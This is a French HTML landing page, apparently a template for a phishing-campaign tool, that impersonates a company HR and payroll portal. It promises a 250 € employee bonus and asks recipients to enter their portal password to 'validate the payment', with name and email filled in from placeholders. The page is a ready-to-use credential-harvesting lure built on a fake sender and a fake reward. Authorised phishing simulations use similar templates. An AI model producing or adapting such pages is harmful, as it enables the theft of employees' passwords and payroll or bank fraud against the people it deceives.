<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/>
	<title>Portail Avantages Salariés</title>
	<style type="text/css">body { font-family: 'Trebuchet MS', sans-serif; background-color: #e8f5e9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 400px; text-align: center; border-bottom: 8px solid #2ecc71; }
        h2 { color: #27ae60; margin-bottom: 20px; }
        .bonus-badge { background: #2ecc71; color: white; padding: 10px; border-radius: 50px; font-weight: bold; display: inline-block; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 25px; text-align: center; }
        button { width: 100%; padding: 15px; background-color: #2ecc71; color: white; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .small { font-size: 11px; color: #999; margin-top: 15px; }
	</style>
</head>
<body>
<div class="card">
<h2>Félicitations {{.FirstName}} !</h2>

<div class="bonus-badge">PRIME QVT DISPONIBLE : 250,00 €</div>

<p style="font-size: 14px;">Connectez-vous à votre espace personnel pour confirmer vos coordonnées bancaires (IBAN).</p>

<form method="POST" action=""><input value="{{.Email}}" readonly="readonly" type="text"/> <input type="password" placeholder="Mot de passe portail" required="" name="password"/><button type="submit">VALIDER MON VERSEMENT</button></form>

<div class="small">Direction des Ressources Humaines - Service Comptabilité Paie</div>
</div>


</body></html>
